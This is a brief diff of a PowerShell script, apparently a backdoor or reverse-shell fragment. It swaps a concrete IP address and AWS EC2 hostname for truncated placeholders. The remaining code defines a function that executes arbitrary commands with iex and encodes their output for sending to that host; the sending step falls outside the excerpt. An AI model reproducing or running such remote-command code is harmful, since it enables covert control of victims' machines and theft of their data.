@@ -1,5 +1,5 @@
-$ip = "54.169.42.247";
-$url = "ec2-54-169-42-247.ap-southeast-1.compute.amazonaws.com.";
+$ip = "54.";
+$url = "ec2.com.";
 function funny($cmd) {
 $c = iex $cmd 2>&1 | Out-String;
 $u = [system.Text.Encoding]::UTF8.GetBytes($c);
